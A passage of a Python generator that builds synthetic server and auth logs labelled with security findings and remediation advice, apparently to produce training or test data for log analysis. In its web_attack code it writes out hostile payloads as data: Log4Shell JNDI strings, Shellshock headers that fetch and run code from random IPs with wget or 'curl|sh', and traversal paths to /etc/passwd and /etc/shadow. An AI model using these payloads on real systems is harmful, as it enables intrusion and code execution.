    "webshell_access": ("Isolate the server, remove the script, audit uploads and disable PHP execution in upload directories.",
                        "Isoler le serveur, supprimer le script, auditer les uploads et interdire l'exécution PHP dans les dossiers d'upload."),
    "http_flood": ("Apply rate limiting (limit_req) and block {ip} if abusive.", "Appliquer une limitation de débit (limit_req) et bloquer {ip} si abusif."),
    "server_errors": ("Check the backend/application logs and service health.", "Vérifier les logs de l'application/backend et l'état du service."),
    "ssh_brute_force": ("Disable password authentication, use SSH keys and enable fail2ban; block {ip}.",
                        "Désactiver l'authentification par mot de passe, utiliser des clés SSH et activer fail2ban ; bloquer {ip}."),
    "ssh_user_enumeration": ("Disable password auth and enable fail2ban for sshd.", "Désactiver l'authentification par mot de passe et activer fail2ban pour sshd."),
    "distributed_ssh_brute_force": ("Use key-only SSH, move SSH behind a VPN or restrict by source IP.",
                                    "SSH par clé uniquement, placer SSH derrière un VPN ou filtrer par IP source."),
    "compromised_account": ("Lock the account, kill its sessions, rotate credentials and investigate activity from {ip} immediately.",
                            "Verrouiller le compte, tuer ses sessions, changer les identifiants et enquêter immédiatement sur l'activité de {ip}."),
    "root_login": ("Set PermitRootLogin no and use sudo from named accounts.", "Mettre PermitRootLogin no et utiliser sudo depuis des comptes nominatifs."),
    "unusual_login": ("Verify with the user that this login is legitimate.", "Vérifier auprès de l'utilisateur que cette connexion est légitime."),
    "privilege_escalation_attempt": ("Investigate why this account tries to use sudo.", "Vérifier pourquoi ce compte tente d'utiliser sudo."),
    "sudo_auth_failure": ("Confirm the failed sudo attempts were made by the legitimate user.",
                          "Confirmer que les échecs sudo viennent bien de l'utilisateur légitime."),
    "suspicious_sudo_command": ("Treat the host as potentially compromised: review the command, files downloaded and persistence.",
                                "Considérer l'hôte comme potentiellement compromis : analyser la commande, les fichiers téléchargés et la persistance."),
    "account_created": ("Confirm the account creation was authorized; remove it otherwise.", "Confirmer que la création du compte était autorisée ; sinon le supprimer."),
    "port_scan": ("No action needed if the firewall holds; consider blocking {ip}.", "Rien à faire si le pare-feu tient ; envisager de bloquer {ip}."),
    "repeated_blocked_connections": ("Verify the port should stay closed; block {ip} if persistent.",
                                     "Vérifier que le port doit rester fermé ; bloquer {ip} si l'activité persiste."),
    "oom_kill": ("Add RAM/swap, set memory limits or fix the memory leak in the killed process.",
                 "Ajouter de la RAM/du swap, fixer des limites mémoire ou corriger la fuite mémoire du processus tué."),
    "segfault": ("Check for a buggy update or corrupted binary; collect a core dump.", "Rechercher une mise à jour boguée ou un binaire corrompu ; récupérer un core dump."),
    "disk_error": ("Check SMART status (smartctl -a), back up data and run fsck.", "Vérifier l'état SMART (smartctl -a), sauvegarder les données et lancer fsck."),
    "hardware_error": ("Run hardware diagnostics (memtest, mcelog) and check temperatures.", "Lancer des diagnostics matériels (memtest, mcelog) et vérifier les températures."),
    "kernel_oops": ("Update the kernel/driver and check for exploitation attempts around that time.",
                    "Mettre à jour le noyau/pilote et rechercher des tentatives d'exploitation à ce moment."),
    "syn_flood": ("Enable SYN cookies (net.ipv4.tcp_syncookies=1) and rate-limit at the edge.",
                  "Activer les SYN cookies (net.ipv4.tcp_syncookies=1) et limiter le débit en amont."),
    "conntrack_full": ("Increase nf_conntrack_max and investigate the traffic source.", "Augmenter nf_conntrack_max et identifier la source du trafic."),
    "unsigned_module": ("Verify the module origin (lsmod, modinfo); unexpected modules can indicate a rootkit.",
                        "Vérifier l'origine du module (lsmod, modinfo) ; un module inattendu peut indiquer un rootkit."),
    "apparmor_denied": ("Check whether the denied access is expected; adjust the profile or investigate the process.",
                        "Vérifier si l'accès refusé est normal ; ajuster le profil ou enquêter sur le processus."),
    "usb_device": ("Confirm the USB device was connected by an authorized person.", "Confirmer que le périphérique USB a été branché par une personne autorisée."),
    "service_failure": ("Inspect the service with systemctl status / journalctl -u and fix the configuration.",
                        "Inspecter le service avec systemctl status / journalctl -u et corriger la configuration."),
    "suspicious_cron": ("Remove the cron entry and check the downloaded payload; host may be compromised.",
                        "Supprimer l'entrée cron et analyser la charge téléchargée ; l'hôte est peut-être compromis."),
    "ssh_scan": ("Typical internet background scanning; keep SSH key-only and up to date.", "Bruit de fond typique d'Internet ; garder SSH à jour et par clé uniquement."),
    "fail2ban_ban": ("fail2ban is working; review bantime and consider permanent blocks for repeat offenders.",
                     "fail2ban fonctionne ; revoir bantime et envisager un blocage permanent des récidivistes."),
    "firewall_disabled": ("Re-enable UFW (ufw enable) and find out who disabled it.", "Réactiver UFW (ufw enable) et identifier qui l'a désactivé."),
}


# --------------------------------------------------------------------------- scenario builder
class Scenario:
    def __init__(self, rng: R, split):
        self.r = rng
        self.split = split
        self.lines: list[Line] = []
        self.findings: list[Finding] = []
        self.host = rng.choice(HOSTS)
        self.domain = rng.choice(DOMAINS)
        self.server_ip = rng.choice([rng.priv_ip(), rng.pub_ip()])
        y = rng.randint(2023, 2027)
        self.t0 = dt.datetime(y, rng.randint(1, 12), rng.randint(1, 28), rng.randint(0, 23), rng.randint(0, 59), rng.randint(0, 59),
                              rng.randint(0, 999999))
        self.span = rng.choice([60, 300, 900, 3600, 3 * 3600, 12 * 3600])
        self.tz = rng.choice(["+0000"] * 4 + ["+0100", "+0200", "-0500", "+0530"])
        self.syslog_kind = rng.choice(["syslog", "syslog", "iso", "iso", "syslog0"])
        self.dmesg_kind = rng.choice(["uptime", "uptime", "T", "uptime_kernel"])
        self.boot = self.t0 - dt.timedelta(seconds=rng.randint(30, 3_000_000))
        self.used_ips = set()
        self.users = rng.sample(FIRST, 4)
        self.admin_ips = [rng.priv_ip() for _ in range(2)] + [rng.pub_ip()]
        self.pid = rng.randint(800, 400000)
        self.mac = ":".join(f"{rng.randint(0, 255):02x}" for _ in range(12)) + ":08:00"
        self.uid = {u: 1000 + i for i, u in enumerate(self.users)}
        self.iface = rng.choice(["eth0", "ens3", "eno1", "enp3s0", "enp0s31f6", "wlo1", "ens18"])

    # time helpers
    def rt(self):
        if getattr(self, "floor", None):
            return self.floor + dt.timedelta(seconds=self.r.uniform(1, max(60, self.span / 3)))
        return self.t0 + dt.timedelta(seconds=self.r.uniform(0, self.span))

    def burst(self, n, secs=None):
        start = self.rt()
        secs = secs or self.r.choice([5, 20, 60, 180, 600])
        return sorted(start + dt.timedelta(seconds=self.r.uniform(0, secs)) for _ in range(n))

    def new_ip(self, private=False):
        while True:
            ip = self.r.priv_ip() if private else self.r.pub_ip()
            if ip not in self.used_ips:
                self.used_ips.add(ip)
                return ip

    def npid(self):
        self.pid += self.r.randint(1, 900)
        return self.pid

    def add(self, line, finding=None, nc=False):
        if finding is not None:
            line.fid = finding
        if nc:
            line.meta["nc"] = True
        self.lines.append(line)

    # ---------------- web
    def web_line(self, src, t, ip, method, path, status, size=None, ua=None, ref="-", user="-", fid=None):
        size = size if size is not None else (self.r.randint(150, 60000) if status == 200 else self.r.randint(0, 600))
        ua = ua or self.r.choice(UAS)
        req = f"{method} {path} HTTP/{self.r.choice(['1.1', '1.1', '2.0', '1.0'])}"
        ts = ts_fmt(t, "clf", self.tz)
        fmt = getattr(self, "webfmt", "combined")
        if src == "apache_access" and self.vhost:
            text = f'{self.domain}:{self.r.choice([80, 443])} {ip} - {user} [{ts}] "{req}" {status} {size} "{ref}" "{ua}"'
        elif fmt == "custom_rt":
            rt_ = self.r.uniform(0, 0.3) if status != 404 else 0.0
            text = f'{ip} [{ts}] host={self.domain} "{req}" {status} {size} rt={rt_:.3f} uct="{"-" if status in (404, 403) else f"{rt_ / 10:.3f}"}" ua="{ua}"'
        elif fmt == "combined_xff":
            text = f'{ip} - {user} [{ts}] "{req}" {status} {size} "{ref}" "{ua}" "-" rt={self.r.uniform(0, 0.4):.3f}'
        elif fmt == "json":
            ts = ts_fmt(t, "iso_s", self.tz)
            text = json.dumps({"time": ts, "remote_addr": ip, "method": method, "uri": path, "status": status, "bytes": size, "referer": ref, "user_agent": ua,
                               "request_time": round(self.r.uniform(0, 0.3), 3)}, ensure_ascii=False)
        else:
            text = f'{ip} - {user} [{ts}] "{req}" {status} {size} "{ref}" "{ua}"'
        return Line(t, text, src, ts, fid, ip=ip, method=method, path=path, status=status, ua=ua)

    def web_noise(self, src, n):
        clients = [self.new_ip() for _ in range(self.r.randint(2, 7))] + [self.r.choice(self.admin_ips)]
        weights = [self.r.uniform(0.5, 5) for _ in clients]
        ua_of = {c: self.r.choice(UAS) for c in clients}
        for _ in range(n):
            ip = self.r.choices(clients, weights)[0]
            t = self.rt()
            path = self.r.choice(PAGES + ASSETS)
            method = "GET" if self.r.random() < 0.9 else self.r.choice(["POST", "HEAD"])
            status = self.r.choices([200, 304, 301, 404, 302, 499, 206], [70, 10, 4, 6, 4, 1, 1])[0]
            if path in ("/api/health",):
                status = 200
            ref = self.r.choice(["-", "-", f"https://{self.domain}/", "https://www.google.com/"])
            self.add(self.web_line(src, t, ip, method, path, status, ua=ua_of[ip], ref=ref))
        # an occasional lone 404 probe from internet noise below threshold (not a finding)
        if self.r.random() < 0.35:
            ip = self.new_ip()
            self.add(self.web_line(src, self.rt(), ip, "GET", self.r.choice(["/robots.txt", "/favicon.ico", "/.well-known/security.txt", "/"]),
                                   self.r.choice([200, 404]), ua=self.r.choice(UAS)))

    def web_attack(self, src, kind, ip=None):
        r = self.r
        ip = ip or self.new_ip()
        if kind in ("sql_injection", "xss", "path_traversal", "command_injection"):
            n = r.randint(3, 18)
            pool = {"sql_injection": SQLI, "xss": XSS, "path_traversal": TRAVERSAL, "command_injection": CMDI}[kind]
            base = r.choice(SQLI_PATHS)
            mode = r.choice(["blocked", "attempted", "possibly_successful"])
            ua = r.choice([SCANNER_UAS["sqlmap"]] if kind == "sql_injection" and r.random() < 0.4 else UAS + ["python-requests/2.31.0", "Go-http-client/1.1"])
            f = Finding(kind, "medium", src, mode, [ip], extra={"target": base if kind in ("sql_injection", "xss") else "the web server"})
            for t in self.burst(n):
                p = r.choice(pool)
                path = base + p if p.startswith("?") else p
                if mode == "blocked":
                    st = r.choice([403, 403, 406, 400])
                elif mode == "attempted":
                    st = r.choice([404, 400, 403, 500, 404])
                else:
                    st = r.choice([200, 200, 500, 404])
                self.add(self.web_line(src, t, ip, r.choice(["GET", "GET", "POST"]), path, st, ua=ua), f)
            if mode == "possibly_successful":
                # ensure at least one 200
                for l in self.lines[::-1]:
                    if l.fid is f:
                        l.meta["status"] = 200
                        l.text = self.web_line(src, l.t, ip, l.meta["method"], l.meta["path"], 200, ua=ua).text
                        break
            f.severity = {"blocked": "medium", "attempted": "medium", "possibly_successful": "high"}[mode]
            if kind == "command_injection" and mode != "blocked":
                f.severity = "high" if mode == "attempted" else "critical"
            if kind == "xss" and mode != "possibly_successful":
                f.severity = "low"
            self.findings.append(f)
        elif kind == "log4shell":
            n = r.randint(1, 5)
            f = Finding(kind, "high", src, "attempted", [ip])
            cb = r.pub_ip()
            for t in self.burst(n):
                pl = r.choice(["${jndi:ldap://%s:1389/a}" % cb, "${${lower:j}ndi:${lower:l}dap://%s/Exploit}" % cb,
                               "${jndi:rmi://%s:1099/obj}" % cb, "%24%7Bjndi%3Aldap%3A%2F%2F" + cb + "%3A389%2FBasic%2FCommand%7D"])
                where = r.choice(["ua", "path"])
                path = "/" if where == "ua" else "/?x=" + pl
                self.add(self.web_line(src, t, ip, "GET", path, r.choice([200, 404, 400]), ua=pl if where == "ua" else r.choice(UAS)), f)
            self.findings.append(f)
        elif kind == "shellshock":
            n = r.randint(1, 4)
            f = Finding(kind, "high", src, "attempted", [ip])
            for t in self.burst(n):
                ua = r.choice(["() { :; }; /bin/bash -c \"wget http://%s/x -O /tmp/x\"" % r.pub_ip(), "() { :;}; echo; /bin/cat /etc/passwd",
                               "() { ignored; }; /bin/bash -c 'curl %s|sh'" % r.pub_ip()])
                self.add(self.web_line(src, t, ip, "GET", r.choice(["/cgi-bin/test.cgi", "/cgi-bin/status", "/cgi-bin/bash"]), r.choice([404, 403, 500]), ua=ua), f)
            self.findings.append(f)
        elif kind == "vulnerability_scanner":
            tool = r.choice(list(SCANNER_UAS))
            n = r.randint(6, 25)
            f = Finding(kind, "medium", src, "attempted", [ip], extra={"tool": tool})
            paths = SENSITIVE + WP_PROBES + ["/", "/admin", "/login", "/test", "/backup", "/old", "/cgi-bin/", "/api/swagger.json"]
            for t in self.burst(n, r.choice([10, 30, 90])):
                self.add(self.web_line(src, t, ip, r.choice(["GET", "GET", "HEAD", "POST"]), r.choice(paths), r.choice([404, 404, 404, 403, 301, 400]),
                                       ua=SCANNER_UAS[tool]), f)
            self.findings.append(f)
        elif kind in ("sensitive_file_probe", "cms_admin_probe"):
            pool = SENSITIVE if kind == "sensitive_file_probe" else WP_PROBES
            n = r.randint(4, 14)
            hit = r.random() < 0.2 and kind == "sensitive_file_probe"
            f = Finding(kind, "medium" if kind == "sensitive_file_probe" else "low", src, "possibly_successful" if hit else "blocked" if r.random() < 0.3 else "attempted", [ip])
            ua = r.choice(UAS + ["python-requests/2.31.0", "Go-http-client/1.1", "Mozilla/5.0 (Linux; U; Android 4.0.3)", "-"])
            paths = r.sample(pool, min(n, len(pool)))
            ts = self.burst(len(paths), r.choice([5, 20, 60]))
            for i, (t, p) in enumerate(zip(ts, paths)):
                st = 200 if (hit and i == len(paths) // 2) else (403 if f.status == "blocked" else r.choice([404, 404, 404, 301, 403]))
                self.add(self.web_line(src, t, ip, "GET", p, st, ua=ua), f)
            if hit:
                f.severity = "critical"
                f.extra["exposed"] = [l.meta["path"] for l in self.lines if l.fid is f and l.meta["status"] == 200]
            self.findings.append(f)
        elif kind == "web_brute_force":
            target = r.choice(["/wp-login.php", "/login", "/api/auth/login", "/user/login", "/admin/login.php", "/xmlrpc.php"])
            n = r.randint(8, 30)
            success = r.random() < 0.25
            f = Finding(kind, "medium", src, "possibly_successful" if success else "attempted", [ip], extra={"target": target})
            fail_st = {"/wp-login.php": 200, "/xmlrpc.php": 200}.get(target, r.choice([401, 403]))
            for i, t in enumerate(self.burst(n, r.choice([30, 120, 600]))):
                st = fail_st
                if success and i == n - 1:
                    st = 302
                self.add(self.web_line(src, t, ip, "POST", target, st, size=r.randint(200, 4000), ua=r.choice(UAS[:3] + ["python-requests/2.31.0"])), f)
            if success:
                f.severity = "high"
            self.findings.append(f)
        elif kind == "webshell_access":
            target = r.choice(WEBSHELLS)
            n = r.randint(2, 8)
            f = Finding(kind, "critical", src, "successful", [ip], extra={"target": target})
            for t in self.burst(n, 300):
                self.add(self.web_line(src, t, ip, r.choice(["POST", "POST", "GET"]), target + r.choice(WEBSHELL_QS), 200, size=r.randint(20, 3000),
                                       ua=r.choice(UAS + ["-", "Mozilla/5.0"])), f)
            self.findings.append(f)
        elif kind == "http_flood":
            n = r.randint(30, 45)
            secs = r.choice([3, 5, 8, 10])
            f = Finding(kind, "medium", src, "observed", [ip], extra={"secs": secs})
            p = r.choice(PAGES[:6] + ["/search?q=a", "/api/v1/items"])
            ua = r.choice(UAS + ["Go-http-client/1.1", "python-aiohttp/3.9"])
            for t in self.burst(n, secs):
                self.add(self.web_line(src, t, ip, "GET", p, r.choice([200, 200, 200, 503, 429]), ua=ua), f)
            self.findings.append(f)
        elif kind == "server_errors":
            n = r.randint(4, 15)
            target = r.choice(["/api/v1/orders", "/checkout", "/api/v1/users/me", "/graphql", "/api/v2/payments"])
            f = Finding(kind, "medium", src, "observed", [], extra={"target": target})
            for t in self.burst(n, r.choice([30, 120, 600])):
                self.add(self.web_line(src, t, self.new_ip(), r.choice(["GET", "POST"]), target, r.choice([500, 502, 502, 503, 504])), f)
            f.ips = []
            self.findings.append(f)

    def nginx_error_lines(self, n_noise, attacks):
        r = self.r
        src = "nginx_error"
        for _ in range(n_noise):
            t = self.rt()
            ts = ts_fmt(t, "nginx_err")
            ip = self.new_ip()
            msg = r.choice([
                f'[error] {r.randint(100, 9999)}#{r.randint(100, 9999)}: *{r.randint(1, 999999)} open() "/var/www/html/favicon.ico" failed (2: No such file or directory), client: {ip}, server: {self.domain}, request: "GET /favicon.ico HTTP/1.1", host: "{self.domain}"',
                f'[notice] {r.randint(100, 9999)}#{r.randint(100, 9999)}: signal process started',
                f'[warn] {r.randint(100, 9999)}#{r.randint(100, 9999)}: *{r.randint(1, 999999)} an upstream response is buffered to a temporary file /var/cache/nginx/proxy_temp/1/00/0000000001 while reading upstream, client: {ip}, server: {self.domain}',
                f'[info] {r.randint(100, 9999)}#{r.randint(100, 9999)}: *{r.randint(1, 999999)} client closed connection while waiting for request, client: {ip}, server: 0.0.0.0:443',
                f'[notice] {r.randint(100, 9999)}#{r.randint(100, 9999)}: using inherited sockets from "6;7;"'])
            self.add(Line(t, f"{ts} {msg}", src, ts))
        for kind in attacks:
            if kind == "server_errors":
                up = r.choice(["127.0.0.1:8000", "unix:/run/php/php8.3-fpm.sock", "127.0.0.1:3000", "10.0.0.5:8080"])
                f = Finding("server_errors", "medium", src, "observed", [], extra={"target": f"upstream {up}"})
                for t in self.burst(r.randint(3, 10), r.choice([20, 120])):
                    ts = ts_fmt(t, "nginx_err")
                    ip = self.new_ip()
                    why = r.choice(["connect() failed (111: Connection refused)", "upstream timed out (110: Connection timed out)",
                                    "recv() failed (104: Connection reset by peer)", "no live upstreams"])
                    self.add(Line(t, f'{ts} [error] {r.randint(100, 9999)}#{r.randint(100, 9999)}: *{r.randint(1, 999999)} {why} while reading response header from upstream, client: {ip}, server: {self.domain}, request: "GET /api/v1/items HTTP/1.1", upstream: "http://{up}/api/v1/items", host: "{self.domain}"', src, ts, ip=ip), f)
                self.findings.append(f)
            elif kind == "path_traversal":
                ip = self.new_ip()
                f = Finding("path_traversal", "medium", src, "blocked", [ip], extra={})
                for t in self.burst(r.randint(2, 6)):
                    ts = ts_fmt(t, "nginx_err")
                    p = r.choice(["/etc/passwd", "../../../../etc/shadow", "/proc/self/environ"])
                    self.add(Line(t, f'{ts} [error] {r.randint(100, 9999)}#{r.randint(100, 9999)}: *{r.randint(1, 999999)} open() "/var/www/html/{p}" failed (2: No such file or directory), client: {ip}, server: {self.domain}, request: "GET /..%2f..%2f..{p} HTTP/1.1", host: "{self.server_ip}"', src, ts, ip=ip), f)
                self.findings.append(f)
            elif kind == "sensitive_file_probe":
                ip = self.new_ip()
                f = Finding("sensitive_file_probe", "medium", src, "blocked", [ip])
                for t, p in zip(self.burst(r.randint(3, 8)), r.sample(SENSITIVE, 8)):
                    ts = ts_fmt(t, "nginx_err")
                    self.add(Line(t, f'{ts} [error] {r.randint(100, 9999)}#{r.randint(100, 9999)}: *{r.randint(1, 999999)} access forbidden by rule, client: {ip}, server: {self.domain}, request: "GET {p} HTTP/1.1", host: "{self.domain}"', src, ts, ip=ip), f)
                self.findings.append(f)
            elif kind == "web_brute_force":
                ip = self.new_ip()
                f = Finding("web_brute_force", "medium", src, "blocked", [ip], extra={"target": "/admin (basic auth)"})
                u = r.choice(["admin", "root", "test", "user"])
                for t in self.burst(r.randint(5, 14), 120):
                    ts = ts_fmt(t, "nginx_err")
                    self.add(Line(t, f'{ts} [error] {r.randint(100, 9999)}#{r.randint(100, 9999)}: *{r.randint(1, 999999)} user "{u}": password mismatch, client: {ip}, server: {self.domain}, request: "GET /admin HTTP/1.1", host: "{self.domain}"', src, ts, ip=ip), f)
                self.findings.append(f)
            elif kind == "http_flood":
                ip = self.new_ip()
                f = Finding("http_flood", "medium", src, "blocked", [ip], extra={"secs": 10})
                for t in self.burst(r.randint(6, 15), 10):
                    ts = ts_fmt(t, "nginx_err")
                    self.add(Line(t, f'{ts} [error] {r.randint(100, 9999)}#{r.randint(100, 9999)}: *{r.randint(1, 999999)} limiting requests, excess: {r.uniform(5, 50):.3f} by zone "req_limit", client: {ip}, server: {self.domain}, request: "GET / HTTP/1.1", host: "{self.domain}"', src, ts, ip=ip), f)
                self.findings.append(f)

    def apache_error_lines(self, n_noise, attacks):
        r = self.r
        src = "apache_error"

        def L(t, mod, lvl, ip, msg, f=None):
            ts = ts_fmt(t, "apache_err")
            pid = r.randint(1000, 99999)
            cl = f" [client {ip}:{r.port()}]" if ip else ""
            self.add(Line(t, f"[{ts}] [{mod}:{lvl}] [pid {pid}:tid {r.randint(100000000000, 140000000000000)}]{cl} {msg}", src, ts, ip=ip), f)

        for _ in range(n_noise):
            t = self.rt()
            c = r.random()
            if c < 0.3:
                L(t, "mpm_event", "notice", None, "AH00489: Apache/2.4.58 (Ubuntu) configured -- resuming normal operations")
            elif c < 0.6:
                L(t, "core", "info", self.new_ip(), "AH01964: Connection to child 3 established (server " + self.domain + ":443)")
            elif c < 0.8:
                L(t, "ssl", "warn", None, f"AH01909: {self.domain}:443:0 server certificate does NOT include an ID which matches the server name")
            else:
                L(t, "php", "notice", self.new_ip(), "PHP Notice:  Undefined index: lang in /var/www/html/index.php on line 12")
        for kind in attacks:
            ip = self.new_ip()
            if kind == "path_traversal":
                f = Finding("path_traversal", "medium", src, "blocked", [ip])
                for t in self.burst(r.randint(2, 6)):
                    L(t, "core", "error", ip, r.choice(["AH10244: invalid URI path (/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd)",
                                                         "AH00126: Invalid URI in request GET /../../../etc/passwd HTTP/1.1",
                                                         "AH01630: client denied by server configuration: /var/www/html/../../etc/shadow"]), f)
                self.findings.append(f)
            elif kind == "sql_injection":
                f = Finding("sql_injection", "medium", src, "blocked", [ip], extra={"target": "the web app (ModSecurity)"})
                for t in self.burst(r.randint(2, 6)):
                    L(t, "security2", "error", ip, f'ModSecurity: Access denied with code 403 (phase 2). detected SQLi using libinjection. [file "/usr/share/modsecurity-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"] [id "942100"] [msg "SQL Injection Attack Detected via libinjection"] [hostname "{self.domain}"] [uri "/index.php"]', f)
                self.findings.append(f)
            elif kind == "server_errors":
                f = Finding("server_errors", "medium", src, "observed", [], extra={"target": "PHP application"})
                for t in self.burst(r.randint(3, 8)):
                    L(t, "php", "error", self.new_ip(), r.choice(["PHP Fatal error:  Uncaught PDOException: SQLSTATE[HY000] [2002] Connection refused in /var/www/html/db.php:14",
                                                                  "PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in /var/www/html/report.php on line 88",
                                                                  "AH01071: Got error 'Primary script unknown'"]), f)
                self.findings.append(f)
            elif kind == "command_injection":
                f = Finding("command_injection", "high", src, "attempted", [ip])
                for t in self.burst(r.randint(1, 4)):
                    L(t, "cgi", "error", ip, r.choice(["AH01215: sh: 1: wget: not found: /usr/lib/cgi-bin/ping.cgi",
                                                       "AH01215: /bin/sh: curl: Permission denied: /usr/lib/cgi-bin/status.cgi",
                                                       "AH01215: uid=33(www-data) gid=33(www-data) groups=33(www-data): /usr/lib/cgi-bin/diag.cgi"]), f)
                if any("uid=33" in l.text for l in self.lines if l.fid is f):
                    f.status, f.severity = "successful", "critical"
                self.findings.append(f)

    # ---------------- auth / sshd
    def sys_ts(self, t):
        return ts_fmt(t, self.syslog_kind, self.tz)

    def syslog_line(self, t, prog, msg, src, fid=None, **meta):
        ts = self.sys_ts(t)
        pid = meta.pop("pid", None)
        p = f"{prog}[{pid}]" if pid else prog
        return Line(t, f"{ts} {self.host} {p}: {msg}", src, ts, fid, **meta)

    def auth_noise(self, n):
        r = self.r
        for _ in range(n):
            t = self.rt()
            c = r.random()
            u = r.choice(self.users)
            if c < 0.3:
                ip = r.choice(self.admin_ips)
                pid = self.npid()
                method = r.choice(["publickey", "publickey", "password"])
                fp = "RSA SHA256:" + "".join(r.choices(string.ascii_letters + string.digits + "+/", k=43)) if method == "publickey" else ""
                self.add(self.syslog_line(t, "sshd", f"Accepted {method} for {u} from {ip} port {r.port()} ssh2" + (f": {fp}" if fp else ""), "auth",
                                          pid=pid, user=u, ip=ip, event="accepted"))
                self.add(self.syslog_line(t + dt.timedelta(milliseconds=30), "sshd", f"pam_unix(sshd:session): session opened for user {u}(uid={r.randint(1000, 1010)}) by {u}(uid=0)", "auth", pid=pid, user=u, event="session"))
            elif c < 0.5:
                self.add(self.syslog_line(t, "CRON", f"pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)", "auth", pid=self.npid(), event="cron"))
            elif c < 0.62:
                cmd = r.choice(NORMAL_SUDO)
                self.add(self.syslog_line(t, "sudo", f"{u:>8} : TTY=pts/{r.randint(0, 4)} ; PWD=/home/{u} ; USER=root ; COMMAND={cmd}", "auth", user=u, event="sudo", cmd=cmd))
            elif c < 0.72:
                self.add(self.syslog_line(t, "systemd-logind", f"New session {r.randint(1, 900)} of user {u}.", "auth", pid=r.randint(500, 1500), user=u, event="session"))
            elif c < 0.82:
                self.add(self.syslog_line(t, "sshd", f"Received disconnect from {r.choice(self.admin_ips)} port {r.port()}:11: disconnected by user", "auth", pid=self.npid(), event="disconnect"))
            elif c < 0.9:
                # internet background noise: 1-2 failures, below threshold
                ip = self.new_ip()
                iu = r.choice(INVALID_USERS)
                pid = self.npid()
                self.add(self.syslog_line(t, "sshd", f"Invalid user {iu} from {ip} port {r.port()}", "auth", pid=pid, user=iu, ip=ip, event="invalid"))
                self.add(self.syslog_line(t + dt.timedelta(seconds=2), "sshd", f"Connection closed by invalid user {iu} {ip} port {r.port()} [preauth]", "auth", pid=pid, ip=ip, event="closed"))
            elif c < 0.93:
                ip = self.new_ip()
                self.add(self.syslog_line(t, "sshd", f"Connection closed by {ip} port {r.port()} [preauth]", "auth", pid=self.npid(), ip=ip, event="closed"))
            else:
                self.auth_benign_extra(t, u)
        # very common real-world benign lines
        for _ in range(r.randint(0, n)):
            self.auth_benign_extra(self.rt(), r.choice(self.users))

    def auth_hard_negative(self):
        """Looks alarming to a naive reader but is normal admin activity: must produce NO finding."""
        r = self.r
        u = r.choice(self.users)
        ip = r.choice(self.admin_ips)
        t = self.rt()
        pid = self.npid()
        k = r.randint(0, 2)
        if k == 0:  # one or two typos then success
            for i in range(r.randint(1, 2)):
                self.add(self.syslog_line(t + dt.timedelta(seconds=i * 4), "sshd", f"Failed password for {u} from {ip} port {r.port()} ssh2", "auth", pid=pid, user=u, ip=ip, event="failed"))
            self.add(self.syslog_line(t + dt.timedelta(seconds=9), "sshd", f"Accepted password for {u} from {ip} port {r.port()} ssh2", "auth", pid=pid, user=u, ip=ip, event="accepted"))
        elif k == 1:  # ssh-agent offering too many keys
            pp = r.port()
            if r.random() < 0.6:
                self.add(self.syslog_line(t, "sshd", f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}  user={u}", "auth", pid=pid, ip=ip, user=u))
                self.add(self.syslog_line(t + dt.timedelta(seconds=2), "sshd", f"Failed password for {u} from {ip} port {pp} ssh2", "auth", pid=pid, user=u, ip=ip, event="failed"))
            self.add(self.syslog_line(t + dt.timedelta(seconds=3), "sshd", f"error: maximum authentication attempts exceeded for {u} from {ip} port {pp} ssh2 [preauth]", "auth", pid=pid, ip=ip, user=u, event="maxauth"))
            self.add(self.syslog_line(t + dt.timedelta(seconds=3), "sshd", f"Disconnecting authenticating user {u} {ip} port {pp}: Too many authentication failures [preauth]", "auth", pid=pid, ip=ip))
        else:  # sudo typo then success
            self.add(self.syslog_line(t, "sudo", f"pam_unix(sudo:auth): authentication failure; logname={u} uid={self.uid.get(u, 1000)} euid=0 tty=/dev/pts/1 ruser={u} rhost=  user={u}", "auth", user=u, event="sudo_fail"))
            cmd = r.choice(NORMAL_SUDO)
            self.add(self.syslog_line(t + dt.timedelta(seconds=5), "sudo", f"{u:>8} : TTY=pts/1 ; PWD=/home/{u} ; USER=root ; COMMAND={cmd}", "auth", user=u, event="sudo", cmd=cmd))

    def app_noise(self, n):
        r = self.r
        app = r.choice(["zallama", "node-app", "gunicorn", "uvicorn", "dockerd", "containerd", "grafana", "myapi", "worker", "ollama", "traefik"])
        pid = r.randint(500, 900000)
        style = r.choice(["ansi", "json", "plain", "logfmt"])
        msgs = ["Stopped model 'qwen-7b' (idle)", "Evicting idle model: embed-small", "request completed", "GET /api/v1/items 200 12ms", "health check ok",
                "Loaded model in 3.2s", "connection pool size=10 idle=7", "job finished id=4411 failed=0 retries=0", "cache miss key=user:42",
                "Started server on 127.0.0.1:8080", "Shutting down gracefully", "rotated log file", "error=None status=ok", "worker 3 exited cleanly",
                "POST /v1/chat/completions 200 1.82s", "scheduled backup completed", "token refreshed for service account", "denied=0 allowed=12"]
        for _ in range(n):
            t = self.rt()
            m = r.choice(msgs)
            lvl = r.choice(["INFO", "INFO", "INFO", "DEBUG"])
            if style == "ansi":
                body = f"#033[2m{t:%Y-%m-%dT%H:%M:%S}.{t.microsecond:06d}Z#033[0m #033[32m {lvl}#033[0m #033[2m{app}::server#033[0m#033[2m:#033[0m {m}"
            elif style == "json":
                body = json.dumps({"level": lvl.lower(), "ts": f"{t:%Y-%m-%dT%H:%M:%S}Z", "msg": m, "service": app})
            elif style == "logfmt":
                body = f'time="{t:%Y-%m-%dT%H:%M:%S}Z" level={lvl.lower()} msg="{m}"'
            else:
                body = f"[{t:%Y-%m-%d %H:%M:%S}] {lvl}: {m}"
            self.add(self.syslog_line(t, app, body, "syslog", pid=pid))

    def auth_benign_extra(self, t, u):
        r = self.r
        pid = self.npid()
        k = r.randint(0, 9)
        if k <= 2:
            self.add(self.syslog_line(t, "CRON", "pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)", "auth", pid=pid, event="cron"))
            self.add(self.syslog_line(t + dt.timedelta(milliseconds=r.randint(2, 900)), "CRON", "pam_unix(cron:session): session closed for user root", "auth", pid=pid, event="cron"))
        elif k == 3:
            self.add(self.syslog_line(t, "sshd", f"pam_unix(sshd:session): session closed for user {u}", "auth", pid=pid, user=u, event="session"))
        elif k == 4:
            sid = r.randint(1, 900)
